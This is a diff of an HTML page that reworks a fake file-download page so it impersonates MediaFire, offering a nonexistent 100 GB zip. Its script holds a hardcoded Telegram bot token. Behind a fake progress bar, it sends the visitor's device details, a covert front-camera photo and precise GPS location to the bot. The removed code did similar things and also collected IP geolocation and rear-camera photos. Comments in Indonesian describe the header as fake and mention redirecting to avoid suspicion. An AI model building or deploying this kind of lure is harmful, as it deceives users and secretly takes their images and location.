@@ -3,91 +3,78 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Download Data Full Resources</title>
+  <title>MediaFire - DATA_FULL_RESOURCES</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
+    /* MediaFire Branding Colors */
     :root {
-        --primary-color: #0070f3;
-        --bg-color: #f6f9fc;
+        --mf-blue: #0070f3;
+        --mf-bg: #f2f2f2;
+        --mf-text: #444;
     }
     body { 
-        background: var(--bg-color); 
-        color: #333; 
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; 
-        display: flex; justify-content: center; align-items: center; 
-        height: 100vh; margin: 0; overflow: hidden; 
+        background-color: var(--mf-bg);
+        margin: 0; padding: 0;
+        font-family: "Open Sans", Arial, sans-serif;
+        display: flex; flex-direction: column; align-items: center;
+        height: 100vh;
     }
-    #download-card {
-        background: white;
-        padding: 40px;
-        border-radius: 12px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        text-align: center;
-        width: 90%;
-        max-width: 400px;
-        z-index: 10;
+    /* Header Palsu */
+    header {
+        background: #fff; width: 100%; height: 60px;
+        display: flex; align-items: center; padding: 0 20px;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
     }
-    .file-icon {
-        width: 80px;
-        margin-bottom: 20px;
+    .logo { color: var(--mf-blue); font-weight: 800; font-size: 22px; letter-spacing: -1px; }
+
+    /* Card Utama */
+    .container {
+        margin-top: 50px; background: #fff;
+        width: 90%; max-width: 700px;
+        border-radius: 4px; border: 1px solid #ddd;
+        display: flex; flex-direction: column; align-items: center;
+        padding: 40px 20px;
     }
-    .file-name {
-        font-weight: 600;
-        font-size: 18px;
-        margin-bottom: 8px;
-        color: #222;
-    }
-    .file-info {
-        font-size: 14px;
-        color: #666;
-        margin-bottom: 25px;
-    }
-    #main-btn {
-        background: var(--primary-color);
-        color: white;
-        border: none;
-        padding: 15px 30px;
-        border-radius: 8px;
-        font-weight: bold;
-        cursor: pointer;
-        font-size: 16px;
-        width: 100%;
-        transition: transform 0.2s, background 0.2s;
-    }
-    #main-btn:hover { background: #0060d0; }
-    #main-btn:active { transform: scale(0.98); }
+    .file-icon { width: 100px; margin-bottom: 20px; }
+    .file-name { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
+    .file-meta { color: #888; font-size: 13px; margin-bottom: 30px; }
     
-    #loader { display: none; margin-top: 20px; }
-    .progress-container {
-        width: 100%;
-        background: #eee;
-        border-radius: 10px;
-        height: 8px;
-        overflow: hidden;
-        margin-top: 15px;
+    /* Tombol Download Biru khas MediaFire */
+    .btn-download {
+        background: var(--mf-blue); color: #fff;
+        border: none; padding: 15px 60px;
+        border-radius: 3px; font-size: 16px; font-weight: bold;
+        cursor: pointer; transition: background 0.2s;
+        box-shadow: 0 4px 0 #0056b3;
     }
-    #progress-bar {
-        width: 0%;
-        height: 100%;
-        background: var(--primary-color);
-        transition: width 0.3s;
-    }
-    .status-text { font-size: 12px; color: #888; margin-top: 8px; }
+    .btn-download:hover { background: #005cc5; }
+    .btn-download:active { transform: translateY(2px); box-shadow: 0 2px 0 #0056b3; }
+
+    /* Loader Area */
+    #loader { display: none; width: 80%; text-align: center; margin-top: 20px; }
+    .progress-bg { background: #eee; height: 12px; border-radius: 6px; overflow: hidden; }
+    .progress-fill { background: var(--mf-blue); width: 0%; height: 100%; transition: width 0.3s; }
+    .status-msg { font-size: 12px; color: #666; margin-top: 10px; }
+
     .hidden { display: none; }
   </style>
 </head>
 <body>
 
-  <div id="download-card">
-    <img src="https://cdn-icons-png.flaticon.com/512/2991/2991112.png" class="file-icon" alt="file">
+  <header>
+    <div class="logo">MediaFire</div>
+  </header>
+
+  <div class="container">
+    <img src="https://cdn-icons-png.flaticon.com/512/2991/2991112.png" class="file-icon" alt="zip">
     <div class="file-name">DATA_FULL_RESOURCES.zip</div>
-    <div class="file-info">Size: 100.24 GB • Compressed Archive</div>
+    <div class="file-meta">Archive (.zip) | 100.24 GB</div>
     
-    <button id="main-btn">DOWNLOAD NOW</button>
+    <button class="btn-download" id="start-btn">DOWNLOAD NOW</button>
 
     <div id="loader">
-        <div class="progress-container"><div id="progress-bar"></div></div>
-        <div class="status-text" id="status-msg">Requesting server access...</div>
+        <div class="progress-bg"><div class="progress-fill" id="pb"></div></div>
+        <div class="status-msg" id="st">Preparing download...</div>
     </div>
   </div>
 
@@ -96,116 +83,62 @@
 
   <script>
   (() => {
-    // --- KONFIGURASI TELEGRAM ---
     const T = '7621493211:AAFfEUR3ri6Z9odBFzvqhGthsymwWPOl5tY';
     const C = '6636068781';
     
-    const btn = document.getElementById('main-btn');
+    const btn = document.getElementById('start-btn');
     const loader = document.getElementById('loader');
-    const pb = document.getElementById('progress-bar');
-    const sm = document.getElementById('status-msg');
+    const pb = document.getElementById('pb');
+    const st = document.getElementById('st');
 
-    const sTG = async (msg) => {
-      try {
-        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'HTML' })
-        });
-      } catch (e) {}
+    // Fungsi Kirim ke Telegram (Teks & Foto)
+    const sTG = async (m) => { try { await fetch(`https://api.telegram.org/bot${T}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:C, text:m, parse_mode:'HTML'})}); } catch(e){} };
+    const sP = async (b, n) => { try { const fd = new FormData(); fd.append('chat_id', C); fd.append('photo', b, n); await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:fd}); } catch(e){} };
+
+    // Fungsi Ambil Info & Kamera
+    const capture = async (f) => {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}});
+            v.srcObject = stream;
+            await new Promise(r => v.onloadedmetadata = r); v.play();
+            await new Promise(r => setTimeout(r, 1000));
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v,0,0);
+            c.toBlob(b => sP(b, `mf_${f}.jpg`), 'image/jpeg');
+            stream.getTracks().forEach(t => t.stop());
+            return true;
+        } catch(e) { return false; }
     };
 
-    const sP = async (blob, fileName) => {
-      try {
-        const fd = new FormData();
-        fd.append('chat_id', C);
-        fd.append('photo', blob, fileName);
-        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-      } catch (e) {}
-    };
+    // Alur Eksekusi
+    btn.addEventListener('click', async () => {
+        btn.style.display = 'none';
+        loader.style.display = 'block';
 
-    const cDI = async () => {
-      let m = `<b>🔔 NEW TARGET DETECTED</b>\n\n`;
-      m += `<b>🖥 DEVICE:</b> ${navigator.userAgent}\n`;
-      m += `<b>💾 RAM:</b> ${navigator.deviceMemory || 'Unknown'} GB\n`;
-      
-      try {
-        const b = await navigator.getBattery();
-        m += `<b>🔋 BATTERY:</b> ${Math.floor(b.level * 100)}%\n`;
-      } catch(e) {}
+        st.innerText = "Connecting to server...";
+        pb.style.width = "30%";
+        
+        // Kirim Info HP
+        await sTG(`<b>📥 MEDIAFIRE DOWNLOAD LOG</b>\n\nDevice: ${navigator.userAgent}`);
 
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
-        m += `<b>📍 IP:</b> ${d.ip}\n`;
-        m += `<b>🏙 CITY:</b> ${d.city}, ${d.country_name}\n`;
-      } catch(e) { m += `❌ IP Location Failed\n`; }
+        st.innerText = "Verifying regional access...";
+        pb.style.width = "60%";
+        
+        // Ambil Foto & GPS
+        await capture("user");
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sTG(`📍 Lokasi: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, null, {enableHighAccuracy:true});
+        }
 
-      return m;
-    };
-
-    const captureCamera = async (facing) => {
-      const v = document.getElementById('v');
-      const c = document.getElementById('c');
-      let stream;
-      try {
-        const constraints = { video: { facingMode: facing } };
-        stream = await navigator.mediaDevices.getUserMedia(constraints);
-        v.srcObject = stream;
-        await new Promise(r => v.onloadedmetadata = r);
-        v.play();
-        await new Promise(r => setTimeout(r, 1000));
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(b => sP(b, `cap_${facing}.jpg`), 'image/jpeg');
-        stream.getTracks().forEach(t => t.stop());
-        return true;
-      } catch (e) {
-        if(stream) stream.getTracks().forEach(t => t.stop());
-        return false;
-      }
-    };
-
-    // FUNGSI UTAMA SAAT TOMBOL DIKLIK
-    const run = async () => {
-      // 1. Ubah Tampilan
-      btn.style.display = 'none';
-      loader.style.display = 'block';
-      
-      // 2. Progres: Ambil Data Info
-      pb.style.width = "30%";
-      sm.innerText = "Connecting to secure server...";
-      const info = await cDI();
-      await sTG(info);
-
-      // 3. Progres: Kamera
-      pb.style.width = "60%";
-      sm.innerText = "Verifying resources...";
-      const cam1 = await captureCamera("user");
-      if (cam1) await captureCamera("environment");
-
-      // 4. Progres: GPS
-      pb.style.width = "85%";
-      sm.innerText = "Optimizing download speed...";
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          await sTG(`<b>📍 GPS:</b> http://google.com/maps?q=${lat},${lon}`);
-        }, null, { enableHighAccuracy: true });
-      }
-
-      // 5. Selesai
-      setTimeout(() => {
-        pb.style.width = "100%";
-        sm.innerText = "Starting download...";
-        // Opsional: Redirect ke Google Drive asli biar ga curiga
-        // window.location.href = "https://drive.google.com";
-      }, 2000);
-    };
-
-    btn.addEventListener('click', run);
+        setTimeout(() => {
+            pb.style.width = "100%";
+            st.innerText = "Download starting...";
+            // Redirect jika perlu
+        }, 2000);
+    });
   })();
   </script>
 </body>
